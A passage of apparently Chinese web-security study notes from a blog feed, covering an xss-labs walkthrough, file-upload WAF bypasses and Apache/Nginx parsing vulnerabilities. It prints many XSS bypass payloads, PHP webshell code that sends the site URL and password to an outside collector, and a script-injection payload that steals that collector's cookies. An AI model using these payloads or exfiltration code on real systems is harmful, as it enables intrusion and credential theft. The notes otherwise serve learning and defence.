onfocus=&quot;javascript:alert(/xss/)</span><br></pre></td></tr></table></figure><h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h4><p>将on过滤了，过滤成o_n了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&quot; o_nfocus=&quot;javascript:alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure><h5 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h5><p>将XSS代码写成超链接形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;click me &lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h4><p>将href过滤了，可以通过大小写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hREf=&quot;javascript:alert(/xss/)&quot;&gt;click me &lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h4><p>JavaScript的script替换为空了，所以我们双写绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure><h4 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h4><p>JavaScript的script过滤了，大小写没绕过，所以考虑编码绕过</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117966.png" alt="image-20210908214650837" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;#99;ript:alert(/xss/)</span><br></pre></td></tr></table></figure><h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h4><p>//注释掉后面的<code>http://www.baidu.com</code>绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;#99;ript:alert(/xss/)//http://www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>隐藏文本框，只有第三个有效</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117702.png" alt="image-20210908214904179"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level10.php?t_sort=&quot; type=&#x27;text&#x27; onfocus=&quot;alert(/xss/)&amp;submit=submit</span><br></pre></td></tr></table></figure><h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h3><h5 id="知识-1"><a href="#知识-1" class="headerlink" title="知识"></a>知识</h5><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117422.png" alt="image-20210908220057180"></p><h5 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h5><p>抓包，将Referer值修改为payload便能通过这一关</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117427.png" alt="image-20210329174228158"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure><h4 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h4><p>抓包，改一下UA值</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117252.png" alt="image-20210329174644639"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure><h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h3><p>抓包修改cookie值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure><h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h3><p>好像没得环境，这关利用的是exif漏洞，看这个exif的文章吧。</p><p><a href="https://blog.csdn.net/qq_32393893/article/details/104814749">https://blog.csdn.net/qq_32393893/article/details/104814749</a></p><h3 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h3><p>XSS中有文件包含漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level15.php?src=&#x27;level1.php?name=&lt;a href=javascript:alert(1)&gt;aaa&lt;/a&gt;&#x27;</span><br></pre></td></tr></table></figure><h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h3><p>禁掉了空格，用回车代替%0d</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level16.php?keyword=&lt;img%0dsrc=123%0donerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p>火狐和chrome很不一样。。。。chrome上可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level17.php?arg01=%20onmouseover&amp;arg02=javascript:alert(1)</span><br></pre></td></tr></table></figure><h3 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h3><p>一样？？？？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level18.php?arg01=%20onmouseover&amp;arg02=javascript:alert(1)</span><br></pre></td></tr></table></figure><h3 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h3><p>flash XSS chrome都把flash禁了，被淘汰了这flash，不做了不做了。(实际是因为懒)</p><h3 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h3><p>一样懒</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> XSS跨站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>26WEB漏洞-XSS跨站之订单及Shell箱子反杀记</title>
      <link href="/2021/09/21/26WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E8%AE%A2%E5%8D%95%E5%8F%8AShell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80%E8%AE%B0/"/>
      <url>/2021/09/21/26WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E8%AE%A2%E5%8D%95%E5%8F%8AShell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="Postman"><a href="#Postman" class="headerlink" title="Postman"></a>Postman</h3><p>测试XSS返回的cookie是否正常，使用该工具</p><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.postman.com/downloads/</span><br></pre></td></tr></table></figure><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_43184774/article/details/100578557</span><br></pre></td></tr></table></figure><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116195.png" alt="image-20210907171129986"></p><h3 id="WEB-SHELL箱子"><a href="#WEB-SHELL箱子" class="headerlink" title="WEB SHELL箱子"></a>WEB SHELL箱子</h3><p>当你入侵了别人的网站，写入大马或者其他木马，该木马会自动将网站地址和木马的登录密码发送到一个地方，这种就叫做WEB SHELL箱子。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>这只是一种写法，还有很多种。将代码写到大马中，然后当大马被访问的时候。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url=$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;];</span><br><span class="line">echo &quot;&lt;script src=&#x27;http://192.168.1.56/api.asp?url=$url&amp;pass=$password&#x27;&gt;&quot;;</span><br></pre></td></tr></table></figure><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116331.png" alt="image-20210907201815544"></p><p>可以看到发送了一个请求。当你插入这个一句话木马在某个网页，它会发送这个网页的url以及一句话木马的密码到后门服务器</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116212.png" alt="image-20210907201641742"></p><p>webshell箱子已经拿到了地址和密码，通过它就可以登录进去。</p><h4 id="反杀"><a href="#反杀" class="headerlink" title="反杀"></a>反杀</h4><p><strong>当我们找到后门服务器的地址后，可以通过插入XSS语句来反杀后门</strong></p><h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><p>我们可以通过将密码修改为XSS代码，盗取cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.56/api.asp?url=www.baidu.con/1.php&amp;pass=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>成功执行XSS代码</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116210.png" alt="image-20210907202050646"></p><p>如果我们把这个xss代码改为获取cookie的代码，就可以把这个后台给拿下！<strong>后门作者以为你在第一层，其实你在第五层</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.56/api.asp?url=www.huohu.con/1.php&amp;pass=&lt;sCRiPt sRC=//xsshs.cn/m6YT&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116178.png" alt="image-20210907202333035"></p><p>可以看到我们已经获取到cookie了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/xf555er/article/details/105151100</span><br></pre></td></tr></table></figure><h3 id="beef"><a href="#beef" class="headerlink" title="beef"></a>beef</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://smling.blog.csdn.net/article/details/106067842</span><br></pre></td></tr></table></figure><h3 id="XSS攻击位置"><a href="#XSS攻击位置" class="headerlink" title="XSS攻击位置"></a>XSS攻击位置</h3><ul><li>留言板</li><li>评论区</li><li>订单系统</li><li>反馈条件</li><li>…….</li></ul><p>如果网站是用session验证的，那么盗取cookie是登录不成功网站的。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116356.png" alt="image-20210907205111007" style="zoom:67%;" /><h4 id="获取session"><a href="#获取session" class="headerlink" title="获取session"></a>获取session</h4><p>通过跨站脚本攻击让网站访问phpinfo页面，该页面有session的值。XSS平台有这方面的功能。这比较难。</p><h3 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://xss.fbisb.com/ https://github.com/tennc/webshell </span><br><span class="line">https://www.postman.com/downloads/ </span><br><span class="line">https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA 提取码：xiao</span><br><span class="line">https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw 提取码： xiao</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> XSS跨站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>25WEB漏洞-XSS跨站之原理分类及攻击手法</title>
      <link href="/2021/09/21/25WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E5%8E%9F%E7%90%86%E5%88%86%E7%B1%BB%E5%8F%8A%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"/>
      <url>/2021/09/21/25WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E5%8E%9F%E7%90%86%E5%88%86%E7%B1%BB%E5%8F%8A%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="XSS-跨站漏洞产生"><a href="#XSS-跨站漏洞产生" class="headerlink" title="XSS 跨站漏洞产生"></a>XSS 跨站漏洞产生</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>变量在接受数据的时候，数据可以写成javascript的形式，这个代码可以被浏览器识别，并且执行，从而造成了XSS漏洞。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115538.png" alt="image-20210328193439848"></p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul><li>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</li><li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li><li>盗窃企业重要的具有商业价值的资料</li><li>非法转账</li><li>强制发送电子邮件</li><li>网站挂马</li><li>控制受害者机器向其它网站发起攻击</li></ul><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>XSS本质是前端漏洞，产生在前端。</p><h3 id="XSS-跨站漏洞分类："><a href="#XSS-跨站漏洞分类：" class="headerlink" title="XSS 跨站漏洞分类："></a>XSS 跨站漏洞分类：</h3><h4 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h4><p>反射性XSS是一次性的，不会讲XSS代码存储到数据库中，所以每次攻击都需要自己写。</p><p><strong>例子</strong></p><p>当我写入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的时候</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115542.png" alt="image-20210906205629017"></p><p>成功执行js代码，但是当我下一次输入其他的时候，不写入代码却没有弹窗，这就是反射型XSS。</p><h4 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h4><p>存储型XSS是持久性跨站脚本，存储型会将代码保存到数据库中，每当有其他人点击的时候就会进行攻击。存储型XSS一般发生在留言板等地方。</p><p><strong>例子</strong></p><p>当我写入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的时候，每次刷新页面，都会出现弹窗，此时代码已经被存储到数据库中了，这就是存储型XSS。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115887.png" alt="image-20210906205911092"></p><h4 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115896.png" alt="image-20210906205938334"></p><p>dom树XSS执行会在前端代码中进行，不会到后端。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发包 x=xiaodi =&gt; 本地浏览器静态前端代码 =x.php</span><br></pre></td></tr></table></figure><p><strong>例子</strong></p><p> 当我们输入1的时候此链接地址就拼接了我们的输入。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116523.png" alt="image-20210906211533947" style="zoom:50%;" /><p>而且当我们继续点击的时候，代码并没有经过后端处理，而是由前端js代码进行处理，这就是dom型XSS的关键。</p><h3 id="XSS-常规攻击手法"><a href="#XSS-常规攻击手法" class="headerlink" title="XSS 常规攻击手法"></a>XSS 常规攻击手法</h3><p>平台，工具，结合其他等 </p><p>攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址</p><h4 id="cookie-session"><a href="#cookie-session" class="headerlink" title="cookie session"></a>cookie session</h4><p>用户凭据：通过凭据可以判断对方身份信息 </p><p>cookie 存储本地 存活时间较长 小中型 </p><p>session 会话 存储服务器 存活时间较短 大型</p><p>session会占用服务器的资源，但是比较安全。比如说javaweb中的session序列化和反序列化。</p><h3 id="XSS平台使用"><a href="#XSS平台使用" class="headerlink" title="XSS平台使用"></a>XSS平台使用</h3><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116947.png" alt="image-20210907141459574"></p><h4 id="项目代码"><a href="#项目代码" class="headerlink" title="项目代码"></a>项目代码</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115919.png" alt="image-20210907142314237"></p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115379.png" alt="image-20210907143604224"></p><p>发现请求了这个地址。在平台上就有信息了</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116383.png" alt="image-20210907144044866"></p><h3 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://xss8.cc/xss.php?do=login</span><br><span class="line">https://xsshs.cn/xss.php?do=login</span><br><span class="line">https://github.com/do0dl3/xss-labs</span><br><span class="line">http://down.chinaz.com/soft/37581.htm</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> XSS跨站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>24WEB漏洞-文件上传之WAF绕过及安全修复</title>
      <link href="/2021/09/21/24WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/"/>
      <url>/2021/09/21/24WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="上传参数名解析：明确哪些东西能修改？"><a href="#上传参数名解析：明确哪些东西能修改？" class="headerlink" title="上传参数名解析：明确哪些东西能修改？"></a>上传参数名解析：明确哪些东西能修改？</h4><ul><li>Content-Disposition：一般可更改 </li><li>name：表单参数值，不能更改 </li><li>filename：文件名，可以更改 </li><li>Content-Type：文件 MIME，视情况更改</li></ul><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114156.png" alt="image-20210905204247639"></p><h3 id="常见绕过方法："><a href="#常见绕过方法：" class="headerlink" title="常见绕过方法："></a>常见绕过方法：</h3><h4 id="数据溢出-防匹配-xxx…"><a href="#数据溢出-防匹配-xxx…" class="headerlink" title="数据溢出-防匹配(xxx…)"></a>数据溢出-防匹配(xxx…)</h4><p>通过输入大量的无效字符来进行数据溢出，防止匹配。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115504.png" alt="image-20210905181002624" style="zoom: 67%;" /><p>符号变异-防匹配（’ “ ;） </p><p>通过只用一个”进行包裹来绕过匹配。这里单引号也可以。经过测试发现安全狗这里应该是通过检测最后一个双引号或者单引号的位置，然后向前去匹配的。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115068.png" alt="image-20210905190148958"></p><p>数据截断-防匹配(%00 ; 换行)</p><p>第一种<code>;</code> </p><p>通过<code>2.png;.php</code>这样的方式可以进行绕过，但是前提是必须要单引号包裹才可以，<code>;</code>在代码中表示结束的意思，这样就可以绕过了。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115273.png" alt="image-20210905191818352"></p><p>第二种<code>%00</code></p><p>这种方法POST提交需要进行手动编码，通过<code>2.php%00.png</code>形式绕过，%00要编码，原理还是进行截断</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115001.png" alt="image-20210905192300710"></p><p>第三种 换行</p><p>这种方法同意需要单引号包裹才可以，将php进行换行，代码中就会形成<code>p\nh\np</code>的形式，从而绕过检测。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114175.png" alt="image-20210905192746615"></p><p>重复数据-防匹配(参数多次)</p><p>第一种</p><p>这种方法同意需要单引号包裹才可以，写成<code>filename=&#39;1.png&#39;;filename=&#39;2.php&#39;;</code>这样的形式可以绕过，原理是安全狗只会检测第一个遇到的filename的后缀。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115732.png" alt="image-20210905194421815"></p><p>第二种 <code>/</code></p><p><code>/</code>也可以绕过</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114808.png" alt="image-20210905195228972"></p><h4 id="FUZZ字典"><a href="#FUZZ字典" class="headerlink" title="FUZZ字典"></a>FUZZ字典</h4><p>手工测太慢了，使用工具来测试</p><p>需要有FUZZ字典，然后进行字典爆破。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fuzzdb-project/fuzzdb</span><br><span class="line">https://github.com/TheKingOfDuck/fuzzDicts</span><br></pre></td></tr></table></figure><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115945.png" alt="image-20210905203026858" style="zoom:80%;" /><h3 id="文件上传安全修复方案"><a href="#文件上传安全修复方案" class="headerlink" title="文件上传安全修复方案"></a>文件上传安全修复方案</h3><ul><li><p>后端验证：采用服务端验证模式</p></li><li><p>后缀检测：基于黑名单，白名单过滤 </p></li><li><p>MIME 检测：基于上传自带类型检测 </p></li><li><p>内容检测：文件头，完整性检测</p></li><li><p>自带函数过滤：参考 uploadlabs 函数 </p></li><li><p>自定义函数过滤：function check_file(){} </p></li><li><p>WAF 防护产品：宝塔，云盾，安全公司产品等</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>23WEB漏洞-文件上传之解析漏洞编辑器安全</title>
      <link href="/2021/09/21/23WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%89%E5%85%A8/"/>
      <url>/2021/09/21/23WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="apache低版本解析漏洞"><a href="#apache低版本解析漏洞" class="headerlink" title="apache低版本解析漏洞"></a>apache低版本解析漏洞</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把xxxx.php.owf.rar解析成php。</p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114375.png" alt="image-20210904210637550"></p><h3 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h3><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType text/html .html</span><br><span class="line">AddLanguage zh-CN .cn</span><br></pre></td></tr></table></figure><p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p><p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114213.png" alt="image-20210904214801259"></p><h3 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h3><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114804.png" alt="image-20210905145202655"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114227.png" alt="image-20210905145220127"></p><p>访问刚才上传的<code>/1.php%0a</code>，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞：</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114744.png" alt="image-20210905145338522"></p><h3 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h3><h4 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h4><p>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.werner.wiki/file-resolution-vulnerability-nginx/</span><br></pre></td></tr></table></figure><h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>首先上传一个1.png的图片马，上传的时候要在1.png后面加上一个空格(windows则不需要)，之后正常上传。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114922.png" alt="image-20210905154843231"></p><p>之后访问这个图片，访问的时候要抓包，将后缀修改为<code>http://your-ip:8080/uploadfiles/1.png[0x20][0x00].php</code>，即可发现PHP已被解析。</p><p>首先先在png后面加<code>...php</code></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114860.png" alt="image-20210905155452913"></p><p>然后去hex中进行修改，将png前俩个点修改为20和00.</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114138.png" alt="image-20210905155625642"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114897.png" alt="image-20210905155819496"></p><p>发送以后，我返回200，成功解析php代码。</p><h3 id="WEB-编辑器"><a href="#WEB-编辑器" class="headerlink" title="WEB 编辑器"></a>WEB 编辑器</h3><p>网站后台中经常会有添加文字内容这类功能，而这一功能有时候会使用web编辑器来完成。WEB编辑器可以对文字、图片、音频等内容进行处理。而这些WEB编辑器存在一些安全问题，如果我们知道了该编辑器的名字和版本，就可以通过搜索得知他的具体漏洞情况。</p><p>一般通过扫描网站路径来获取编辑器信息。</p><h4 id="编辑器漏洞手册"><a href="#编辑器漏洞手册" class="headerlink" title="编辑器漏洞手册"></a>编辑器漏洞手册</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 